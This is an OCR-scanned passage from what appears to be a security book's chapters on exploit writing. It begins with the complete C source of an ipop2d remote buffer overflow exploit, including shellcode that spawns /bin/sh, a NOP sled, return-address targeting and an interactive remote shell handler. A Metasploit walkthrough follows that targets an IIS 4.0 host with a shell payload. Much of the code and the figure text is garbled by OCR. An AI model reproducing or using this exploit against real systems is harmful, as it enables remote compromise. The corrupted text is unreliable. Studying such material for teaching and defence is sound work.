#define RET 0xbffff64e 
1 1 
#deftne maxfa, b) 
( la) > [b> ? (a) : (b) ) 
12 
1 3 int shell lint); 
14 
int imap_server () ; 
15 
void usage{char * } ; 
16 
int connect ion (char *) ; 
17 
int gec_verslon(char *} -, 
1 8 unsigned long resolve{char * ) ; 
19 
20 char shellcode[] = 
21 
"\x99\x52\x6B\x2f\x2f\x73\x68\x6a\x2f\x62\x69\x6e" 
22 
"\x89\xe3\x52\x54\x54\x59\x6a\x0b\x58\xcd\x80-; 
23 
24 struct platform { 
25 
Char * version; 
26 
int offset; 
27 
int alignj 
28 }; 
29 
30 
struct platform targets[4] = 
31 
( 
32 
C "v4.46", 
0, 3 }, 
33 
C "v3.44", 
0, 0 }, 
34 
{ "v3.35", 0, 0 }, 
35 
( NULL, 0, 0 ) 
36 
}; 
37 
3S int main(int argc, char **argv) 
39 { 
40 
int sockfd, i, opt, align, offset, t; 
41 
char *host, *localf *imapH *user, *pass? 
42 
unsigned long addr; 
43 
char sendbuf[1024J, voodoo[1004], hello[50]r 

Chapter 11 * Writing Exploits II 
44 
struct platform *target; 
45 
46 
host = local = imap = user = pass = NULL; 
47 
E = -1; 
48 
offset = align = 0; 
49 
50 
setvbuf(stdout, NULL, _IONBF, 0); 
51 
52 
printf ("Linux ipop2d buffer overflow exploit by bind / 1999\n\n")j 
53 
54 
while((opt = getopttargc, argv, "v: 1:i:u:p:a:o:t:•)) 1= EOF) { 
55 
switch(opt) { 
56 
case 
'V 
57 
case ' 1 ' 
58 
case 
h i ' 
59 
case 
ru' 
60 
case "p1 
61 
case "a" 
62 
case "o" 
63 
case ' t1 
host = optarg; break; 
local = optarg; break; 
imap = optarg; break; 
user = optarg; break; 
pass = optarg; break; 
align = atoi(optarg); break; 
offset = atoi(optarg); break; 
t = atoi(optarg); break; 
64 
default: usage(argv[0]); break; 
65 
} 
66 
} 
67 
68 
if(lhost) 
69 
usage(argv[0]); 
70 
71 
if(!local && !imap) { 
72 
printf("Must specify an IMftP server or your looal ip address\n"); 
73 
e x i t ( - l ) ; 
74 
} 
75 
76 
if(imap && !user) t 
77 
printf ("Must specify a username for third-party IMAP server\n") ; 
78 
a x i t ( - l ) ; 
79 
} 
80 
81 
if(imap &k J pass) { 
82 
p r i n t f ( " M u S t s p e c i f y a password for t h i r d - p a r t y IMAP s e r v e r \ n " ) ; 
83 
e x i t ( - l ) ; 
84 
j 
85 
86 
iff!imap) { 
87 
if (geteuidO ) ( 
88 
printf("Error: You must have root access to use pseudo IMAP server\n"); 
89 
e x i t ( - l ) , 
90 
} 
91 
} 
92 
93 
if <t < 0) { 
94 
printf("Identifying server version,•}; 
95 
t 
= 
g e t _ v e r s i o n ( h o s t ) ; 
96 
i 
97 
98 
target = &targets[t); 
99 
100 
if (imap) 

Writing Exploits II • Chapter 11 
101 
snprintf(hello, sizeof(hello), "HELO %s:%s %s\r\n", imap, user, pass); 
102 
else 
103 
snprintf(hello, 
sizeof(hello), 
"HELO %s:test t e s t \ r \ n " , 
local); 
104 
105 
align += 
64 - (strlen(hello) - 2) ; 
106 
1 07 
sockfd = connection(host); 
108 
iffsockfd < 0) { 
109 
printf(",failed\n"); 
1 10 
exit l-l) ; 
111 
) 
112 
113 
sendlsockfd, hello, strlen(hello), 0); 
114 
115 
if ( !imap) { 
116 
if (imap_server () < 0) { 
117 
close (sockfd) ; 
118 
e x i t ( - l ) ; 
119 
} 
120 
> else { 
121 
printf("Waiting for POP2 to authenticate with IMAP server"); 
122 
f o r d = 0; i < 10; i++) ( 
123 
printf (","),-
124 
sleep(l); 
125 
i f ( i == 9) printf rcompleted\rr); 
126 
) 
127 
> 
128 
129 
putchar( • \n' ) ; 
130 
131 
132 
memset(voodoo, 0x90, 1004); 
133 
memcpy(voodoo + 500, shellcode, strlen(shellcode) ) ; 
134 
135 
addr = RET - target->offset - offset; 
136 
137 f or (i = (strlen(shellcode) + (600 •+ target->align*align) ); i < = 1004; i + = 4) 
1 33 
* (long *}&voodoo(i] = addr; 
139 
1 40 
snprintf(sendbuf, sizeof(sendbuf), "FOLD %s\n", voodoo); 
141 
send(sockfd, sendbuf, strlen(sendbuf), 0); 
142 
143 
shell(sockfd) ; 
144 
145 
exit(0); 
146 } 
147 
148 int get_version(char *hostJ 
149 
1 50 
int sockfd, 
i; 
151 
char recvbuf [1024]; 
152 
1 53 
sockfd • connection(host); 
154 if (sockfd < 0) 
1 55 
return(-l); 
156 
1 57 
recv(sockfd, recvbuf, sizeof(recvbuf), 0); 

Chapter 11 * Writing Exploits II 
158 
159 
for(i = 0; targets [i] .version 1= NULL; i++) { 
160 
printf (•-">; 
161 
if(strstr(recvbuf, targets[i].versionJ 1= NULL) ( 
162 
printf("adjusted for %s\n"r targets[i].version); 
163 
close(sockfd); 
164 
returnti) ; 
165 
} 
166 
} 
167 
168 
close(sockfd); 
1 69 
printf("no adjustments made\n"); 
170 
return(O); 
171 } 
172 
173 int connectiontchar *host) 
174 < 
175 
int SOCkfd, c; 
176 
struct sockaddr_in sin; 
177 
1 7 8 
SOCkfd = socket<AF_INET, SOCK_STREAM, 
0 ) ; 
179 
iffsockfd •; 0) 
180 
r e t u r n ( soclcf d) ; 
181 
1 8 2 
sin.siTl_family = AF_INET; 
183 
sin.sin_port = htons{109); 
184 
sinrsin_addr,s_addr = resolve{host); 
185 
186 
c = connect(sockfd, {struct sockaddr *)&sinH sizeof(sin)); 
187 if(c < 0) { 
188 
c l o s e ( s o c k f d ) ; 
1 8 9 
r e t u m ( c ) ; 
190 } 
191 
192 
return (sockfd) ; 
193 } 
194 
195 int imap_server() 
196 { 
197 
int ssockfdn csockfd, cien; 
198 
struct sockaddr_in ssin, csin; 
199 
char sendbuf[1024], recvbuf[1024]; 
200 
2 0 1 
ssockfd = socket(AF_IHET, 
SOCK_STREAM, 0) ; 
202 
iffssockfd < 0) 
2 0 3 
r e t u r n ( s s o c k f d l i 
204 
205 
ssin. sin_f amily = AF_INET; 
206 
ssin.sin_port = ntohs(143); 
207 
ssin,sin_addr.s_addr = INADDR_ANY; 
208 
209 
if(bind(ssockfd, (struct sockaddr *}&ssin, sizeof(ssin)) < 0) { 
210 
printfl"\nError: bindO failed\n") ; 
21 1 
returnt-1); 
212 ) 
213 
214 
printf("Pseudo IMAP server waiting for connection.•); 

Writing Exploits II • Chapter 11 
215 
216 
if(listen(ssockfa, 10) < 0) { 
217 
printf ( " \nError: listen() failed\n"); 
218 
return(-l) ; 
219 
} 
220 
221 
p r i n t ! (" . ") ; 
222 
223 
clen = sizeof{csin); 
224 
memset(kcsin, 0, sizeof (csin)); 
225 
226 
csockfd = accept{ssockfd, (struct sockaddr *}&csinH iclen); 
227 
iffcsockfd < 0) { 
228 
printf("\n\nError: accept{) failed\n"); 
229 
close{ssockfd) ; 
230 
return(-l) ; 
231 
} 
232 
233 
printf (" . •) ; 
234 
235 
snprintf{sendbuf, sizeof{sendbuf), ** OK localhost IKAP4revl 2001\r\n-); 
236 
237 
send(csockfd, sendbuf, strlen(sendbuf), 0) ,r 
238 
recv(csockfd, 
recvbuf, sizeof frecvbuf) , 0); 
239 
240 
printf (" . ") ; 
241 
242 
snprintf(sendbuf, sizeof{sendbuf), 
243 
•* CAPABILITY IMAP4REV1 IDLE NAMESPACE MAILBOX-REFERRALS SCAN SORT " 
244 
-THREAD=REFERENCES THREAD=ORDEREDSUBJECT MULTIAPPEND LOGIN-REFERRALS " 
245 
"AUTH=LOGIN\r\nO00O00O0 OK CAPABILITY completed\r\n"); 
246 
247 
send(csockfd, sendbuf, strlen(sendbuf) r 0) ; 
248 
recv(csockfd, 
recvbuf, 
sizeof (recvbuf)r 
0); 
249 
250 
printf (".•); 
251 
252 
snprintf {sendbuf, sizeof (sendbuf) , " + VXNlciBOYWllAA==\r\n"} ; 
253 
send(csockfdH sendbuf, strlen(sendbuf), 0); 
254 
recv(csockfd, 
recvbuf, sizeof(recvbuf), Q); 
255 
256 
printf (" . ") ; 
257 
258 
snprintf{sendbuf, sizeof{sendbuf), "+ UGFzc3dvcmQA\r\n"); 
259 
send(csockfdH sendbuf, strlen(sendbuf), 0); 
260 
recv(csockfd, recvbufH Sizeof(recvbuf), 0) ,L 
261 
262 
printf (" . ") ; 
263 
264 
snprintf(sendbuf, sizeof{sendbuf), 
265 
•* CAPABILITY IMAP4REV1 IDLE NAMESPACE MAILBOX-REFERRALS SCAN SORT " 
266 
"THREAD=REFERENCES THREAD=ORDEREDSUBJECT MULTIAPPEND\r\n-
267 
"00000001 OK AUTHENTICATE completed\r\n"); 
268 
269 
send(csockfd, sendbuf, strlen(sendbuf), 0); 
270 
recv(csockfd, 
recvbuf, 
sizeof(recvbuf) r 
0); 
271 

486 
Chapter 11 * Writing Exploits II 
272 
priritf [".*); 
273 
274 
snprintf(sendbuf, sizeof(sendbuf), 
275 
•* 0 EXISTS\r\n* 0 RECENT\r\n" 
276 
"* OK (UIDVALIDITV 1] UID validity status\r\n" 
277 
"* OK [UIENEXT 1] Predicted next UID\r\n" 
278 
"* FLAGS (Wftnswered WFlagged UDeleted WDraft \\Seen)\r\n" 
279 
"* OK [PERMANENT FLAGS (I ] Permanent fiags\r\nr 
280 
"00000002 OK [ READ-WRITE] SELECT completed\r\n"); 
281 
282 
send[csockfdr sendbuf, strlen{sendbuf)i 0}; 
283 
284 
priritf ("completedXn"); 
285 
286 
close(csockfd); 
287 
close(ssockfd); 
288 
289 
return(O); 
290 } 
291 
292 int shelUint sockfd) 
293 { 
294 
fd_set fds; 
295 
int fmax, ret; 
296 
char buf[1024) ; 
297 
298 
frnax = inax(fileno(stdinJ , sockfd) + 1; 
299 
300 
fort;;) 
( 
301 
FD_ZERO(&fds) ; 
302 
FD_SETIfileno[stdin) , &£ds) ; 
303 
FD_SETIsockfd, fcfds); 
304 
if (select (fmax, &fds, NULL, NULL, NULL) < 0) { 
305 
perror("selectU •) ; 
306 
close(sockfd); 
307 
e x i t ( - l ) ; 
308 
} 
309 
if (FD_ISSET (sockfd, &fds)) { 
310 
bzero(buf, sizeof buf) ; 
311 
i f ( ( r e t = recvfsockfd, buf, sizeof buf, 0)) < 0) { 
312 
perror("recvf) ") ; 
313 
close (sockfd); 
314 
exit(-l) ; 
315 
} 
316 
i f C r e t ) { 
317 
fprintf(stderr, 
"Connection clcsed\n") ; 
318 
close (sockfd); 
319 
e x i t ( - l ) ; 
320 
} 
321 
write (fileno(stdout) j buf, ret) ; 
322 
} 
323 
if (FD_ISSET(fileno(stdin) , &fds) ) { 
324 
bzerotbuf, sizeof buf) ; 
325 
ret = reacHfileno(stdin) , buf, sizeof buf) ; 
326 
erroo = 0; 
327 
if(send{sockfdH buf, ret, 0) != ret) { 
328 
if (errno) 

Writing Exploits II • Chapter 11 
\nOptions:\n" 
(-i -cinnap servers) \n" 
[-v. <iinap username] \tl» 
[-p <imap password]\n" 
[-&. <alignment>] \nH 
[-o <a£fset>J\n" 
\nTargets: \n", arg) ; 
329 
perror("sendO ") ; 
330 
else 
331 
fprintf(Stderr, 
"Transmission loss\n _); 
332 
close(sockfd); 
333 
exit (-1) ; 
334 
} 
335 
} 
336 
} 
337 } 
338 
339 void usage{char *argj 
340 { 
341 
int i; 
342 
343 printf("Usage: %s (-v <victim>) (-1 <localhost>] [-t <target>] foptionsJ\n* 
344 
345 
346 
347 
348 
349 
350 
351 
352 
for(i = 0; targetsli].version != NULL; i++) 
353 
printf(" (*dl - P0P2 %s\n-, i, targets(i].version); 
354 
exit (-1) ; 
355 } 
356 
357 unsigned long resolve{char *hostname) 
358 { 
359 
struct sockaddr_in sin; 
360 
struct hostent *hent; 
361 
362 
hent = gethostbyname(hostname) ; 
363 
if (merit) 
364 
return 0; 
365 
366 
bzero((char *) &sin, sizeof(sin)); 
367 
memcpy((char *} &sin.sin_addrH hent->h_addr, hent->h_length) ; 
368 
return sin,sin_addr,s_addr; 
369 } 
This exploit mimics the behavior of an IMAP server, allowing an attacker to cir-
cumvent an outside IMAP server with a valid account.The actual trigger to cause 
exploitation of this vulnerability is quite simple. In lines 107 through 111, a connection 
is initiated to the POP2 servcr.The exploit then calls the imap_server function, which 
creates a pseudo-IMAP server. After the IMAP service is started, the HELO string is sent 
to the POP2 host, causing it to connect to the pseudo-IMAP server to verify that the 
username does indeed exist. When the POP2 server returns success, the FOLD argu-
ment (line 140) is sent with the properly crafted buffer, causing the overflow and arbi-
trary code execution. 

488 
Chapter 11 • Writing Exploits II 
Summary 
% 
A good understanding of debugging, system architecture, and memory layout is required 
to successfully exploit a buffer overflow problem. Shellcode design coupled with limita-
tions of the vulnerability can hinder or enhance the usefulness of an exploit. If other 
data on the stack or heap shrink the length of space available for shellcode, optimized 
shellcode for the attacker's specific task is required. Knowing how to read, modify, and 
write custom shellcode is a must for practical vulnerability exploitation. 
Stack overflows and heap corruption, originally two of the biggest issues within 
software development in terms of potential risk and exposure, are being replaced by the 
relatively newer and more difficult to identify integer bugs. Integer bugs span a wide 
range of vulnerabilities, including type mismatching and multiplication errors. 
Solutions Fast Track 
Coding Sockets and Binding for Exploits 
0 
The domain parameter specifies the method of communication, and in most 
cases ofTCIVIP sockets the domain AF_INET is used. 
0 
The wckfd parameter is the initialized socket descriptor of which the socket 
function must always be called to initialize a socket descriptor before 
attempting to establish the connection. Additionally, the serv_addr structure 
contains the destination port and address. 
0 When writing exploits, there are times that this is needed, such as when using 
connect-back shellcode.To perform the basic needs for creating a server, four 
functions are called.These functions include socket, bind, listen, and accept. 
Stack Overflow Exploits 
0 
Stack-based buffer overflows are considered the most common type of 
exploitable programming errors found in software applications today. A stack 
overflow occurs when data is written past a buffer in the stack space, causing 
unpredictability that can often lead to compromise. 
0 
Over a hundred functions within LIBC have security implications. These 
implications vary from something as little as "pseudorandomness not 
sufficiently pseudorandom" (for example, srandQ) to "may yield remote 
administrative privileges to a remote attacker if the function is implemented 
incorrectly" (for example, printf()). 
www.syngress.com 

Writing Exploits II * Chapter 11 
489 
Heap Corruption Exploits 
0 The heap is an area of memory utilized by an application and allocated 
dynamically at runtime. It is common for buffer overflows to occur in the heap 
memory space and exploitation of these bugs is different than that of stack-
based buffer overflows. 
0 
Unlike stack overflows, heap overflows can be very inconsistent and have 
varying exploitation techniques. In this section, we will explore how heap 
overflows are introduced in applications, how they can be exploited, and what 
can be done to protect against them. 
0 
An application dynamically allocates heap memory as needed.This allocation 
occurs through the function call malloc0.The mallocQ function is called with 
an argument specifying the number of bytes to be allocated and returns a 
pointer to the allocated memory. 
Integer Bug Exploits 
0 Integer wrapping occurs when a large value is incremented to the point where 
it "wraps" and reaches zero, and if incremented further, becomes a small value. 
0 
Integer wrapping also occurs when a small value is decremented to the point 
where it "wraps" and reaches zero, and if decremented further, becomes a large 
value. 
0 It is common for integer bugs to be identified in mallocO; however, it is not a 
problem exclusive to LIBC, malloc, or memory allocation functions. Since 
integer wrapping involves reaching the maximum size threshold of an integer 
and then wrapping to zero or a small number. 
0 
Integer wrapping can also occur when an integer is decremented via 
subtraction or division and reaches zero or wraps to reach a large positive 
number. 
fc»-
Links to Sites 
For more information, go to the following Web sites: 
• 
www.applicationdefense.com Application Defense has a collection of free-
ware tools that it provides to the public to assist with vulnerability identifica-
tion, secure code development, and exploitation automation. 
• 
www.immunitysec.com Dave Aitel's freeware op en-source fuzzing library, 
SPIKE, can be downloaded under the free tools section. 
www.syngress.com 

490 
Chapter 11 • Writing Exploits II 
• 
www.corest.com Core Security Technologies has multiple open-source 
security projects that it has made available to the security community at no 
charge. One of its most popular projects is its InlineEgg shellcode library 
• 
www.eeye.com An excellent site for detailed Microsoft Windows-specific 
vulnerability and exploitation research advisories. 
• 
www.foundstone.com An excellent site that has numerous advisories and 
free tools that can be used to find and remediate vulnerabilities from a network 
perspective. Foundstone also has the largest collection of freeware forensics 
tools available. 
• 
www.idefense.com iDefense has published over fifty vulnerabilities the past 
two years through its vulnerability contributor program (VCP). It is an excel-
lent source of information for gaining detailed information on vulnerabilities. 
Frequently Asked Questions 
The following Frequently Asked Questions, answered by the authors of this book, 
are designed to both measure your understanding of the concepts presented in 
this chapter and to assist you with real-life implementation of these concepts. To 
have your questions about this chapter answered by the author, browse to 
www.syngress.com/solutions and click on the "Ask the Author" form. You will 
also gain access to thousands of other FAQs at ITFAQnet.com. 
Q: If I use an intrusion protection system (IPS) or a utility such as stackguard or a 
non-exec stack patch, can vulnerabilities on my system still be exploited? 
A: Yes. In most cases, these systems make exploitation more difficult but not impos-
sible. In addition, many of the free utilities make exploiting stack overflow vul-
nerabilities more difficult but do not mitigate heap corruption vulnerabilities or 
other types of attacks. 
^ & 
Q: What is the most secure operating system? 
A: No public operating system has proven to be any more secure than any other. 
Some operating systems market themselves as secure, but vulnerabilities are still 
found and fixed (though not always reported). Other operating systems release 
new patches nearly every week, but are scrutinized on a far more frequent basis. 
Q: If buffer overflows and similar vulnerabilities have been around for so long, why 
are they still present in applications? 
A: While typical stack overflows are becoming less prevalent in widely used soft-
ware, not all developers are aware of the risks, and even those that are sometimes 
make mistakes. 
www.syngress.com 

Chapter 12 
Writing Exploits 
Solutions in this Chapter: 
• 
Using the Metasploit Framework 
• 
Exploit Development with Metasploit 
• 
Integrating Exploits into the Framework 
• 
Related Chapters: Chapter 10, Chapter 11 
t h l 
El Summary 
El Solutions Fast Track 
El Frequently Asked Questions 
491 

492 
Chapter 12 * Writing Exploits III 
Introduction 
In 2003, a new security tool called the Mctasploit Framework (MSF) was released to the 
public.This tool was the first open-source and freely available exploit development 
framework, and in the year following its release, MSF rapidly grew to be one of the 
security community's most popular tools. The solid reputation of the framework is due 
to the efforts of the core development team along with external contributors, and their 
hard work has resulted in over 45 dependable exploits against many of the most popular 
operating systems and applications. Released under the GNU GPL and artistic license, 
the Metasploit Framework continues to add new exploits and cutting-edge security fea-
tures with every release. 
We will begin this chapter by discussing how to use the Metasploit Framework as an 
exploitation platform. The focus of this section will be the use of msfconsole, the most 
powerful and flexible of the three available interfaces. Next, the chapter will cover one 
of the most powerful aspects of Metasploit that tends to be overlooked by most users: its 
ability to significantly reduce the amount of time and background knowledge necessary 
to develop functional exploits. By working through a real-wo rid vulnerability against a 
popular closed-source Web server, the reader will learn how to use the tools and features 
of MSF to quickly build a reliable buffer overflow attack as a stand-alone exploit. The 
chapter will also explain how to integrate an exploit directly into the Metasploit 
Framework by providing a line-by-line analysis of an integrated exploit module. Details 
as to how the Metasploit engine drives the behind-the-scenes exploitation process will 
be covered, and along the way the reader will come to understand the advantages of 
exploitation frameworks. 
This text is intended neither for beginners nor for experts. Its aim is to detail the use-
fulness of the Metasploit project tools while bridging the gap between exploitation theory 
and practice.To get the most out of this chapter, one should have an understanding of the 
theory behind buffer overflows as well as some basic programming experience. 
Using the Metasploit Framework 
The Metasploit Framework is written in the Perl scripting language and can be run on 
almost any UNIX-like platform, including the Cygwin environment for Windows.The 
framework provides the user with three interfaces: msfcli, msfweb, and msfconsole. The 
msfcli interface is useful for scripting because all exploit options are specified as argu-
ments in a single command-line statement.The msfweb interface can be accessed via a 
Web browser and serves as an excellent medium for vulnerability demonstrations.The 
msfconsole interface is an interactive command-line shell that is the preferred interface 
for exploit development. 
NOTE 
The various Metasploit interfaces available are all built over a common API 
exported by the Metasploit engine. It is easy to extend the engine to any 
medium such as IRC, where it would be an ideal environment for teaming, col-

Writing Exploits III • Chapter 12 
493 
laboration, and training. There is an unreleased IRC interface that has already 
been developed, and it is rumored that an instant messaging interface may be 
in development. 
The msfconsole interactive command-line interface provides a command set that 
allows the user to manipulate the framework environment, set exploit options, and ulti-
mately deploy the exploit. Unrecognized commands are passed to the underlying oper-
ating system; in this way, a user can run reconnaissance tools without having to leave the 
console. A demonstration of how to use msfconsole will be performed by walking 
through the exploitation of a Windows NT 4 IIS 4.0 host that has been patched to 
Service Pack 5. 
As seen in Figure 12.1, the help menu can be accessed at any time with the question 
mark (?) or help command. 
Figure 12.1 The msfconsole Help Menu 
? 
Metasploit Franework 
? 
cd 
exit 
help 
info 
quit 
reload 
save 
setg 
show 
I 
I I 
• 
• 
1 
• ! 
U S B 
LKMV: inn 
n«:F 
> 
Main Console Help 
Show the tidin console help 
Chan if e uo rk i n g A i rec t o i - • .• 
Exit the console 
Show the nain console help 
Display d e t a i l e d exploit or- payload information 
Exit the console 
Reload exploits and payloads 
Save configuration to disk 
Set a global environment variable 
Show available exploits and pay loads 
Renoue a global environment variable 
Select an exploit by nsne 
Show console version 
V 
-
• 
First, the user lists the available exploits with the show exploits command (see 
Figure 12.2). 
The IIS 4.0 .HTR Buffer Overflow exploit appears promising because our target 
runs IIS 4.0. Using the info command, the user retrieves information about the different 
aspects of the exploit, including target platforms, targeting requirements, payload 
specifics, a description of the exploit, and references to external information sources. 
Notice in Figure 12.3 that the available targets include Windows NT4 SP5,the same as 
our target platform. 
Next, the user instructs the framework to select the IIS 4.0 exploit by entering the 
use iis40_htr command. With tab-completion, which is enabled by default, the user can 
simply type Us4 and then press the Tab key to complete the exploit name. As seen in 
Figure 12.4, the command-line prompt reflects the selection. 

494 
Chapter 12 * Writing Exploits III 
Figure 12.2 The msfconsole Exploit Listing 
• 
• • 
• 
• 
.
-
i
-
l
-
.
-
ltataipl-.lt F r i M w r k Ltntded tripj«iti 
-lBl«l 
M 1 H 
t l 
p 
l»jim••:•:( 
.
.
:
•
!
•
•
• 
*pjt}w rhur>k«Hl wbnJJ 
li]*< 
k j n - 
j 
LLI, 
I I I E L E E ^ 
_ <ork Ci-aditi 
j' LojinEyt FdthttaH OvnrilDL 
._. 
; h>tt»njj*y. (rTuHkJAji ft»*rNi»u 
4[MCIW Uin32 Chunks* Encadlm 
H'i 
:.. n 
u 
.. I.'.H 
icacai t _h*id*i' 
i i FS<_Print« r .vv*rf low 
i l t ^ i iMbdm ntdll 
i 11J v'AVrt 3_thun ked 
l E i _ n 3 E L a ] i > u 
j ~ 3 t 
i i " . 
U l » k > 
M l M T f l f l U 
i n . i l I 
> « , . 
il< l - r t 
ipSjll IH1*U 
ir LI ]!••. r JH-II | H H 
1 * « » J U N . ( I I I 
H rc*n,(-*n ..nj Ft c * rt 
nsrpt 
dc*n * > t l K( 
n-.L'j IIIWIH lirr-iiiChrnt iC»t It 
ni 14 UWRt r* t4 lut IOTH 
Dpariwjiv LIHlluck 
IM EhLa0_rii-a&L i t * _ir*Ad 
n ' ] » rvvr_d**c r l*w-I t « m 
rnilli 
nlTrrmr 
nukbti tr-iniitipon 
i ukbti_[ r i m iti o* n _ss M 
3 .uiharfc _3 • t i r h . m i i I L t 
ii4ttL«]«b-n-il._55 
Enrvu rJtn cvc-rf J«u 
in» j n l f f t r 
J ii Lir J •. _dt 1 L>. '1 ii :i lr 
l i v i d fit In authant i-cat* 
nin*_i»tirt _cti ihit 
I I I I W . J l H | H . I - < l F l 
ut28H_i*t i>r» . 1 f r«x 
i t l t r l F t : u n win 12 
uarF t Kid ID-5-.jhii • 
LM FHT *r_f t p_iii* r 
UEi.9IiU._x,T„L>=L 
u In t _PiitH_kH 3 
I c t e n t <(- Z.H.J > Htiilur Dg«i-yt-EL* f - l n l J i 
IIS 4.H .HTH BnFf.r OvirFlny 
IIS E.I PrLntnr BMfFir h f r f l i v 
i 
• 
•...! 
•.'.•! 
i. 
' 
i i. 
IIS F r o n t i e r t >>JHr*4. d I i trwnHtd tot rF la k. 
• i.dil [EAPI rasi c 
IIS n = L : 
! D v r r F toy 
___ I/IUIH, .J II 
I liftH Ouirfh.u 
| K * j | IMSFHD D t l t t i OvirFln>w 
iFUil LHP S r m i t * Bufrar CKurf lav 
IRIX 
Ipaelud CQMIHMI Ezttit lu 
H L c v i c n f l 
LS.H513 
P K 0 4 - H 1 1 
t k f . r f l A w 
HircmliE Se'tC-rt CGI Qu*rM*w 
flicroi*'t RFC 
KM 
I K 0 3 - « t 
nEsQL IMB/rEDE Hi Ma Buf/Fn-r fcirFloyi 
PflsgL 
ZHUfftDE 
Htltilviiftift frtrMtiv 
HP OpAnWiflw Otviiluck II CaMUrJ EHrcuLian 
! •••• •••- H - i i i iv I!- • I i i u i - i l 1..', 
WmmM-r^.w 
I h s c r i b * 
T h i ' T n r 
O u r r f luti 
S*«lj* Fr»u,"*r»l F£**i rvnb I y Overfjuw 
• : 
. . . i . . . 
i . , . . . 
• . 
J 
. . . . , 
| 
| . . . . 
bi^nthi trifii2i>iMifi Ckiaj-F lew « Hit C"£ X> 
Kinlur k K-cjirtih HEZIILIZ Huff-nr DunrMiiv 
! M I I 1 ( Lftp H+il Kr5 P0F3 e..Ffi-p Qu-rFl°.L> 
Bflru- II FTP& MBIh Overf low 
SnB Pnti-SLMird Cipytur* Sirvicn 
Mtiln.rLi 1Ll1.iH.1L Hrn.f OwrrFliiu 
Sqmid HTU1 HutKwntlc«tn flvepFluw 
EmLwnrsiDfi b*tv Su.nj*pvo 
llriiurr.il..- •_•! IrV. Ii m'^11111 I Hfl FM COrV b r r l l w i 
U r l ^ n l l T at Vnhlr.lDn IFH M LSLB OVPI-F Inn 
U r n ^ l Tr>iin-»iwrt 
! « H I M H ' Ovvrflvv <L.inn») 
ll.'.i^ 
:i...r.,..i yiSIL 
•^.iiH, • r.j^vHr.u (UiiblM; 
V*r PlfB l.t& PASS b t r l J i u 
VdhSTAFt FTP Unrvrr I1SHH (krrFLny 
Hi. ni-.-.Fi SSI. P<:[ rtSEH Mil QVArTltV 
HLtrtiit.fi VIHE IC<H <Hb t^Jd h -n tiL in-i 
Figure 12.3 Retrieving Exploit Information 
in Til ii'.-IH hlr 
NJFHI: US 4.H .HTFt liFFir OvirFlnv 
saii 
Priu-ili,n)! H» 
U1nd.>ur. 10+ SPJ 
JindD,Urr Hf4 !.H 
lFinJ«>HT HT4 EK 
•JJluUfi Orb inJ.:: 
Enplrjltl 
HUHI 
H I * ] 
SSL 
: |.....•• 
2fME 
NwnLrlr 
m 
c l u r u l i r i 
I Hay*,: iwtafih bifid n u t n i 
^VEv"-
m y l n ^ d i: * I p k a - n u u v r Ec * . ! ] y I U C D I I 
Ra F» r r n i •= ; 
Figure 12.4 Selecting an Exploit 
When an exploit is selected, the msfconsole interface changes from main mode to 
exploit mode, and die list of available commands reflects exploit mode options. As an 
example, the show command now displays specific information about the module instead 

Writing Exploits III • Chapter 12 
of a list of available exploits, encoders, or nops. Typing ? or the help command will dis-
play the list of exploit mode commands (see Figure 12.5). 
Figure 12.5 The Exploit Mode Command List 
let asp ID it Eranework 
? 
back 
r:ci 
check 
e x i t 
e x p l o i t 
he lp 
info 
quit 
reload 
rexploit 
save 
s*t 
s e t ? 
show 
unset 
unsetg 
use 
ucr: ion 
Exploit Console Help 
—--—-*———--
Shou the main console help 
Drop back tu the nain nenu 
Cbaoga working d i r e c t o r y 
Perforn v u l n e r a b i l i t y check 
Exit the console 
Launch the Actual e x p l o i t 
Shou the main console help 
Display d e t a i l e d e x p l o i t or payload information 
Exit the console 
Reload e x p l o i t s and payloads 
Reload and e x p l o i t , for us t e s t e r types 
Save eonfiguration to disk 
Set a temporary environment v a r i a b l e 
Set a g l o b a l envirooment variable 
SITOH o p t i o n s , advanced, payloads F or targets 
Remove a temporary environment variable 
Remove a global environment variable 
Select an e x p l o i t by name 
Shou console v e r s i o n 
±1 
_i 
H 
Next, the user examines the list of available targets. In Metasploit, each target speci-
fies a different remote platform that the vulnerable application runs over. Each exploit 
stores unique exploit details based on the targeted host. Picking the wrong target can 
prevent the exploit from working and potentially crash the vulnerable service. 
Because the remote target is running Window NT 4 Service Pack 5, the user sets 
the target platform with the set TARGET 2 command (see Figure 12.6). 
Figure 12.6 Setting the Target Platform 
f iis4H Ktr > shou targets 
Supported Exploit Targets 
8 Windows NI4 EP3 
1 
Windows Nil ST4 
2 
Uindous HI4 SPS 
nsF iis4H_liti* > s e t TARGET 2 
TARGET -> 2 
nsf i i = 4B . h t r > _ 
zl 
After selecting the target, the user must provide additional information about the 
remote host to the framework.This information is supplied through framework environ-
ment variables. A list of required environment variables can be retrieved with the show 
options command. The result of the show options command in Figure 12.7 indicates that 
the RHOST and RPORT environment variables must be set prior to running the 
exploit. To set the remote host environment variable, RHOST, the user enters the com-
mand set RHOST 192.168.119.136 where the IP address of the target machine is 
192.168.119.136.The remote port, RPORT, already has a default value that is consistent 
with our target. 

496 
Chapter 12 * Writing Exploits III 
Figure 12.7 Setting Exploit Options 
| c! ™/Trarnework 
nr.f Lis48_htr > show 
Exploit 
Options 
Exploit - 
N.-iir-
o p t i o n a l 
SSL 
required 
RHOST 
required 
RPORI 
options 
Default 
KM 
Target: Windows NT4 SP3 
nsf 
ii = 40 litr 
s e t RHOST 192.168 
RHOST -> 1S2.168.119.136 
D e s c r i p t i o n 
Use SSL 
The t a r g e t address 
The t a r g e t port 
119.136 
- | Q | X | 
3 
J 
'1 
The set command only modifies the value of the environment variable for the cur-
rently selected exploit. If the user wanted to attempt multiple exploits against the same 
machine, the setg command would be a better option.The setg command global sets the 
value of the global environment variable so it is available to multiple exploits. If a local 
and a global environment variable with the same name is set, the local variable will take 
precedence. 
Depending on the exploit, advanced options may also be available.These variables 
are also set with the set command, but as evidenced in Figure 12.8, the user does not 
need to set any advanced options. 
Figure 12.8 Advanced Options 
is4B_hti* 
shou advanced 
Exploit Opt ions 
Exploit 
<Hsf::Exploit::iis40_htr>: 
ns F iis40 ht r > — 
* 
T 
Next, the user must select a payload for the exploit that will work against the target 
platform. We will discuss payloads in more depth later in the chapter. For now, assume 
that a payload is the "arbitrary code" that an attacker wishes to have executed on a target 
system. In Figure 12.9, the framework displays a list of compatible payloads when the 
user runs the show payloads command. With the set PAYLOAD win32_bitid instruction, a 
payload that returns a shell is added to the exploit. 
One area that differentiates Metasploit from most public stand-alone exploits is the 
ability to select arbitrary payloads, which allows the user to select a payload best suited 
